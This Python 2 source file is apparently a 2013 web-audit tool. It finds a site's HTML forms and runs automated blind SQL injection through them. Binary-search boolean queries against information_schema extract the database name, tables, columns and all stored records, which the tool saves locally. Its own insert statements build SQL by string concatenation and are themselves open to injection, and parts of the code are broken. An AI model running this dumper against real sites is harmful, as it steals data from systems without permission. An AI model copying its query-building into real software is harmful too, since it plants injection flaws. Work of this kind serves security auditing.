'''
Created on 24/04/2013

@author: Jesus Maria Gonzalez Nava
'''
import datetime
import urllib2
from bs4 import BeautifulSoup
from connectionBD import *
from Crawler import Formulario
from connectionBD import BD
import mechanize
from Blind import BlindInjection
import Blind
class MineriaDatos:
    #atributos de la clase MineriaDatos
    lista = []#lista donde se guardaran los objetos de Formulario
    lista2 = []# lista donde se guardaran los objetos de BlindInjection
    #La lista3 contendra valores booleanos al principio a False y servira para cuando se este realizando el dumpeo de la BD que elementos ha conseguido sacar
    nameScan = ''
    urlScan = ''
    createBy = ''
    diccLenCol = {}
    diccNameCol = {}
    numRecords = {}
    lenRecords = {}
    nameRecords = {}
    totalNumRecords = {}
    totalLenRecords = {}
    totalNameRecords = {}
    campoIdWa = '' 
    lista3 = [False, False, False, False]
    bt = ''
    nPeticionesUti = 0
    obj = Formulario() #instancia la clase Scanner, creando el objeto obj.
    obj2 = BlindInjection()#instancia de la clase BlindInjection, creando el objeto obj2
    nInput = [] #almacenamos el numero de campos que tiene cada formulario siendo la posicion 0 referencia para el primer formulario de 0-n
    formulario = ''
    nFormLen = ''#almacenara el numero de formularios que hay en la web
    cur = ''#almacenara el cursor 
    BD = ''#alacenara la cadena de conexion
    '''
        constructor
    '''
    def __init__(self):
        self.lista = []
        self.urlScan = ''
        self.createBy = ''
        self.bt = ''
        self.nameScan = ''
        self.campoIdWa = ''
        self.diccLenCol = {}
        self.diccNameCol = {}
        self.obj = Formulario() 
        self.obj2 = BlindInjection()
        self.nPeticionesUti = 0
        self.nInput = []
        self.numRecords = {}
        self.lenRecords = {}
        self.nameRecords = {}
        self.totalNumRecords = {}
        self.totalLenRecords = {}
        self.totalNameRecords = {} 
        self.formulario = ''
        self.nFormLen = ''
        self.cur = ''
        self.BD = ''
        
    def setNameScan(self, name):
        self.nameScan = name
       
    def setUrl(self, url):
        self.urlScan = url
       
    def setCretedBy(self, name):
        self.createBy = name        
            
    def setConnectionBD(self):
        connectionBD = BD()#creamos la instancia de la clase BD
        connectionBD.setSocket()#se crea la cadena de conexion a la BD
        self.BD  = connectionBD.getDBconnection()#almacenamos la cadena de conexion
        self.cur = connectionBD.getCursor()#almacenamos el cursor 
            
    def setBuscarFormularios(self):
        self.formulario = self.bt.find_all('form')#variable formulario contiene todos los formularios de una pagina
        self.nFormLen = len(self.bt.find_all('form'))#almacenamos el numero de formularios que hay en la variable nForm
        #Sacamos el numero de campos de tipo input que tiene cada formulario siendo la posicion 0 de la lista el numero de campos que tiene formulario 0 de 0-n
        for i in range(0,self.nFormLen):
            self.nInput.append(len(self.formulario[i].find_all('input'))-1)

        
    def setBuscarCampos(self): 
        for i in range(0,self.nFormLen):
            listDataNameField = [] #almacenamos en una lista el nombre del campo.
            listDataTypeField = [] #almacenamos en una lista el tipo de campo que es, se forma una lista por cada formulario
            field = self.formulario[i].find_all('input')
            self.obj.nCampos = len(self.nInput)
            for j in range(0, self.nInput[i]):
                if field[j]['type'] == 'text' or field[j]['type'] == 'password' or field[j]['type'] == 'hidden' or field[j]['type'] == 'radio' or field[j]['type'] == 'textarea' or field[j]['type'] == 'select':
                    listDataNameField.append(field[j]['name'])
                    listDataTypeField.append(field[j]['type'])
            self.obj.action = self.formulario[i]['action']  
            self.obj.method = self.formulario[i]['method']      
            self.obj.name = listDataNameField
            self.obj.tipoCampo = listDataTypeField
            self.lista.append( self.obj)#agregamos el objeto a la lista
            self.obj = Formulario()#se crea otro objeto para crear una nueva referencia cuando se inserte el objeto a la lista
    
    '''
     metodo: dasFormatoId
     description: metodo que recibe como parametro una letra (ID, WF, DF, WA), en funcion de cada letra crea
                 una cadena basandose en la letra el anyo, mes, dia, hora, minuto, segundo y milisegundos, todo esta pensado
                 para crear una cadena que sirva  como un Id.
    '''        
    def darFormatoId(self, tipoTabla):
            fieldId = str(datetime.datetime.now())
            fieldId = fieldId.replace('-','')
            fieldId = fieldId.replace(':','')
            fieldId = fieldId.replace('.', '')
            fieldId = fieldId.replace(' ', '')
            if tipoTabla == 'ID':
                return fieldId
            if tipoTabla == 'WF':#Iniciales de WebInfo
                fieldId = 'WF' + fieldId
                return fieldId
            if tipoTabla == 'DF':#Iniciales de DatosForm
                fieldId = 'DF' +  fieldId
                return fieldId
            if tipoTabla == 'WA':#Iniciales de WebAuditoria
                fieldId = 'WA' + fieldId
                return fieldId
            if tipoTabla == 'WT':#Iniciales de WebTable
                fieldId = 'WT' + fieldId
                return fieldId
            if tipoTabla == 'WC':#Iniciales de WebColumn
                fieldId = 'WC' + fieldId
                return fieldId                
    '''
        metodo: setSaveData
        Descripcion: metodo utilizado para guardar en la base de datos scanner, los datos del formulario que se han ido sacando
                    y guardando en la lista de objetos: "lista"
    '''    
    def setSaveData(self):
         
        campoId = self.darFormatoId('WF')#sacamos el Id para el campo Id de la tabla Escaneos
                
        '''
        function: getNumeroEscaneo.
        description: funcion utilizada para saber el numero de escaneos que se han realizado. 
        '''
        def getNumeroEscaneo(cursor):
            cursor.execute('select numeroEscaneos from Escaneos;')
            rows = cursor.fetchall()
            nEscaneos = 0
            for row in rows:
                nEscaneos = nEscaneos + 1
            
            return nEscaneos
        
        #se inserta un nuevo escaneo en la tabla Escaneos    
        nEscaneo = (getNumeroEscaneo(self.cur)) + 1
        self.cur.execute("insert into Escaneos(numeroEscaneos, Id, name, url, createdBy) value("+str(nEscaneo)+", '"+campoId+"', '"+self.nameScan+"', '"+self.urlScan+"', '"+self.createBy+"');")
        self.BD.commit()
        i = 0#creamos la variable i para utilizarla como iterador del bucle
        self.campoIdWa = self.darFormatoId('WA')
        while i < self.nFormLen:
            campoIdWf = self.darFormatoId('ID')
            campoIdDf = self.darFormatoId('DF')
            self.cur.execute("insert into webInfo(Id, whatEscaneo, whatFormulario, whatAudit, numeroFormularios, metodos, action, numeroCampos) value("+str(campoIdWf)+", '"+campoId+"', '"+campoIdDf+"', '"+self.campoIdWa+"', "+str(self.nFormLen)+", '"+self.lista[i].method+"', '"+self.lista[i].action+"', "+str(self.nInput[i])+");")
            for j in range(0, (self.nInput[i])):
                IdDf = self.darFormatoId('ID')
                try:
                    self.cur.execute("insert into DatosForm(Id, whatFormulario, nombreField, typeField) value("+str(IdDf)+", '"+campoIdDf+"', '"+self.lista[i].name[j]+"', '"+self.lista[i].tipoCampo[j]+"');")
                except MySQLdb.Error:
                    print('Error al insertar datos')
            i = i + 1#incrementamos el valor de i para que al final termine la condificion del while
        self.BD.commit()#confirmamos guardar todos las nuevas inserciones en la BD
        
    def searchBinary(self, browser, i, j, injection, rowBlind, pageDefault, pageModified, condicion):
        
        def getData(numMin, numHigh, blind, flag, num, tipo, num2, num3, num4, num5):
             numMayor = numHigh
             numMin = numMin
             medio = ''
             contador = 1
             while contador <= 8:
                 self.nPeticionesUti = self.nPeticionesUti + 1
                 contador = contador +1
                 medio = (numMayor+numMin)/2
                 browser.select_form(nr = i)
                 if flag == False and (tipo == 'lenBD' or tipo == 'numTable'):
                     browser.form[self.lista[i].name[j]] =  injection + blind +'<' + str(medio) + ' #'
                 if flag == True and tipo == 'nameBD':
                     browser.form[self.lista[i].name[j]] =  injection + blind + str(num) +',1)))' + '<' + str(medio) + ' #'
                 if flag == False and tipo == 'lenTable':
                     browser.form[self.lista[i].name[j]] =  injection + blind + 'limit ' + str(num) + str(', 1)') + '<' + str(medio) + ' #'
                 if flag == True and tipo == 'nameTable':
                     browser.form[self.lista[i].name[j]] =  injection + blind + str(num2) + ',1)) from information_schema.tables where table_schema=database() limit ' + str(num) + ',1)<' + str(medio) + ' #'
                 if flag == False and tipo == 'numColumn':
                     browser.form[self.lista[i].name[j]] =  injection + blind + str(num) + "' and table_schema=database())<" + str(medio) + ' #'
                 if flag == False and tipo == 'lenColumn':
                     browser.form[self.lista[i].name[j]] =  injection + blind + str(num2) + "' and table_schema=database() limit " + str(num) + ", 1)<" + str(medio) + ' #'
                 if flag == True and tipo == 'nameColumn':   
                     browser.form[self.lista[i].name[j]] =  injection + blind + str(num2) + ",1)) from INFORMATION_SCHEMA.COLUMNS where table_name='" + num3 + "' and table_schema=database() limit " + str(num) + ',1)<' + str(medio) + ' #'
                 if flag == False and tipo == 'numRecords':
                     browser.form[self.lista[i].name[j]] =  injection + blind + str(num) + " from " + str(num3) + ")<" + str(medio) + ' #'
                 if flag == False and tipo == 'lenRecords':
                       browser.form[self.lista[i].name[j]] =  injection + blind + str(num) + ") from " + str(num3) + " Limit " + str(num4) + ",1)<" + str(medio) + ' #'
                 if flag == True and tipo == 'nameRecords':
                       browser.form[self.lista[i].name[j]] =  injection + blind + str(num) + ',' + str(num5) + ",1)) from " + str(num3) + " Limit " + str(num4) + ",1)<" + str(medio) + ' #'
                 browser.submit()
                 pageInjection = browser.response().read()
                 if condicion == 'primero':
                     if pageDefault == pageModified and pageDefault != pageInjection:
                         numMayor = medio
                     else:
                         numMin = medio
                 else:
                     if pageDefault == pageInjection and pageModified != pageInjection:
                         numMayor = medio
                     else:
                         numMin = medio
                     
             if flag == False:
                return medio
             else:
                return chr(medio)
            
        def saveData():
            for table in self.obj2.tables:
                campoIdWA = self.darFormatoId('ID')
                campoWT = self.darFormatoId('WT')
                self.cur.execute("insert into webAuditada(Id, whatAudit, whatTable, BD, Tables) value("+str(campoIdWA)+", '"+self.campoIdWa+"', '"+campoWT+"', '"+self.obj2.nameBD+"', '"+table+"');")
                for colum in self.diccNameCol[table]:
                    campoIdC = self.darFormatoId('ID')
                    campoWC = self.darFormatoId('WC')
                    self.cur.execute("insert into Columns(Id, whatTable, whatColumn, nameColumn) value("+str(campoIdC)+", '"+campoWT+"', '"+campoWC+"', '"+colum+"');")
                    self.BD.commit()#confirmamos guardar todos las nuevas inserciones en la BD 
                    for record in self.nameRecords[colum]:
                        campoIdR = self.darFormatoId('ID')
                        self.cur.execute("insert into Records(Id, whatColumn, nameRecord) value("+str(campoIdR)+", '"+campoWC+"', '"+record+"');")
            self.cur.close()#cerramos el cursor
            self.BD.commit()#confirmamos guardar todos las nuevas inserciones en la BD 
            
        '''
        ****************** A partir de aqui empieza todo el comportamieno del metodo serchBinary y las llamadas a la funcion getData *****
        '''   
        print('Nombre del Scan: ' + self.nameScan)                
        if self.lista3[0] == False:
                self.obj2.lenghtBD = getData(1, 80, rowBlind[0][0], False, 1, 'lenBD', 1, 1, 1, 1)
                self.lista3[0] = True
                print('Longitud de la BD : ' + str(self.obj2.lenghtBD))
                if self.lista3[1] == False:
                    h = 1
                    while h <= self.obj2.lenghtBD:
                        self.obj2.nameBD = self.obj2.nameBD + getData(32, 123, rowBlind[0][1], True, h, 'nameBD', 1, 1, 1, 1)
                        h = h + 1
                        
                    print('Nombre de la base de datos: ' + self.obj2.nameBD)
                    self.lista3[1] = True
                    if self.lista3[2] == False:
                        self.obj2.numTable = getData(1,80, rowBlind[0][2], False, 1, 'numTable', 1, 1, 1, 1)
                        print('Numero de tablas: ' + str(self.obj2.numTable))
                        h = 0
                        while h < self.obj2.numTable:
                            self.obj2.lenghtTbs.append(getData(1,80, rowBlind[0][3], False, h, 'lenTable', 1, 1, 1, 1))
                            h = h + 1
                        self.lista3[2] = True
                        print('Longitud de los nombres de las tablas: ' +  str(self.obj2.lenghtTbs))
                        if self.lista3[3] == False:
                            h = 0
                            for t in  self.obj2.lenghtTbs:
                                 p = 1
                                 while p <= t: 
                                     self.obj2.nameTable =  self.obj2.nameTable +  getData(32,123, rowBlind[0][4], True, h, 'nameTable' , p, 1, 1, 1)
                                     p = p + 1
                                 self.obj2.tables.append(self.obj2.nameTable)
                                 self.obj2.nameTable = ''# se establece a cero el valor del atributo nameTable para que no se concatene con el valor de la tabla anterior ya obtenido
                                 self.obj2.numColum.append(getData(1,80, rowBlind[0][5], False, self.obj2.tables[h], 'numColumn' , p, 1, 1, 1))
                                 h = h + 1
                            aux = 0    
                            for s in self.obj2.numColum:
                                 p = 0
                                 self.obj2.lengthColum = []
                                 while p < s:
                                     self.obj2.lengthColum.append(getData(1,80, rowBlind[0][6], False, p, 'lenColumn' , self.obj2.tables[aux], 1, 1, 1))
                                     p = p + 1
                                 self.diccLenCol[self.obj2.tables[aux]] = self.obj2.lengthColum
                                 aux = aux + 1
                            aux = 0
                            for s in self.obj2.numColum:
                                 p = 0
                                 self.obj2.nameColum = []
                                 while p < s:
                                     aux2 = 1
                                     cadena = ''
                                     while aux2 <= self.diccLenCol[self.obj2.tables[aux]][p]:
                                         cadena = cadena + getData(32,123, rowBlind[0][7], True, p, 'nameColumn' , aux2, self.obj2.tables[aux], 1, 1)
                                         aux2 = aux2 + 1
                                     self.obj2.nameColum.append(cadena)
                                     self.numRecords[cadena] = getData(1,80, rowBlind[0][8], False, cadena, 'numRecords' , aux2, self.obj2.tables[aux], 1, 1)
                                     x = 0
                                     self.obj2.lenRecords = []
                                     while x < self.numRecords[cadena]:
                                         self.obj2.lenRecords.append(getData(1,80, rowBlind[0][9], False, cadena, 'lenRecords' , aux2, self.obj2.tables[aux], x, 1))
                                         x = x + 1
                                     w = 0
                                     self.obj2.nameRecords = []
                                     while w < x:
                                         q = 0
                                         nameRecord = ''
                                         while q <= self.obj2.lenRecords[w]:
                                             nameRecord = nameRecord + getData(32,123, rowBlind[0][10], True, cadena, 'nameRecords' , aux2, self.obj2.tables[aux], w, q)
                                             q = q + 1
                                         self.obj2.nameRecords.append(nameRecord)
                                         w = w + 1
                                     self.lenRecords[cadena] = self.obj2.lenRecords
                                     self.nameRecords[cadena] = self.obj2.nameRecords     
                                     p = p  + 1
                                 self.totalLenRecords[self.obj2.tables[aux]]  = self.lenRecords  
                                 self.totalNumRecords[self.obj2.tables[aux]] = self.numRecords
                                 self.diccNameCol[self.obj2.tables[aux]] = self.obj2.nameColum
                                 aux = aux + 1
                                 
                            print('Nombre de las tablas: ' + str(self.obj2.tables))
                            print('Numero de columnas para las tablas: ' + str(self.obj2.numColum))
                            print('Longitud de las columnas en cada tabla: ' + str(self.diccLenCol))
                            print('Nombre de las columnas en cada tabla' +  str(self.diccNameCol))
                            print('Numero de peticiones lanzadas: ' + str(self.nPeticionesUti))
                            print('Total numero de registros en cada tabla: ' + str(self.totalNumRecords))
                            print('Longitud Registros cada campo de cada tabla: ' + str(self.totalLenRecords))
                            print('Nombre de los registros de cada tabla: ' + str(self.nameRecords))
        saveData()#guardamos los datos obtenidos en la base de datos
    '''
    metodo: dumpBD
    description: metodo utilizado para realizar ataques de blind sql injection, con el objetivo de encontrar campos que permitan
                la inserccion de codigo sql.
    '''    
    def dumpBD(self, browser, url):
        self.cur.execute("select injection, blindInjection from injectionAttack")
        rowsInjection = self.cur.fetchall()  
        self.cur.execute("select * from blindInjection;")
        rowsBlind = self.cur.fetchall()
        pageDefault = browser.response().read()
        i = 0
        while i < self.nFormLen:
            browser.select_form(nr = i)
            for j in range(0, (self.nInput[i])):
                browser.form[self.lista[i].name[j]] = 'prueba'
                browser.submit()
                pageModified = browser.response().read()
                browser.open(url)
                for h in rowsInjection:
                    browser.select_form(nr = i)
                    browser.form[self.lista[i].name[j]] =  h[0]
                    browser.submit()
                    pageInjection = browser.response().read()
                    if pageDefault == pageModified and pageDefault != pageInjection:
                            self.searchBinary(browser, i, j, h[1], rowsBlind, pageDefault, pageModified, 'primero')
                    elif pageDefault == pageInjection and pageModified != pageInjection:
                            self.searchBinary(browser, i, j, h[1], rowsBlind, pageDefault, pageModified, 'segundo')

          
            i = i + 1
    

    '''
         metodo: set Mechanize
         description: metodo utilizado para comprobar si los campos que se han ido sacando en el metodo setBuscarCampos, son
                         vulnerables a ataques de blind sql injection
    '''     
    def setMechanizeAuth(self, url, user, passwd, url2):
        browser = mechanize.Browser()
        browser.open(url)
        browser.select_form(nr=0)
        browser.form['username'] = user
        browser.form['password'] = passwd
        browser.submit()
        browser.open(url2)
        self.bt = BeautifulSoup(browser.response().read(), 'html5lib')
        self.setBuscarFormularios()
        self.setBuscarCampos()  
        self.setSaveData()
        self.dumpBD(browser, url2)

         
    def setMechanize(self, url):         
        browser = mechanize.Browser()
        browser.open(url)
        self.setBuscarFormularios()
        self.setBuscarCampos()  
        self.setSaveData()
        self.dumpBD(browser, url)    
        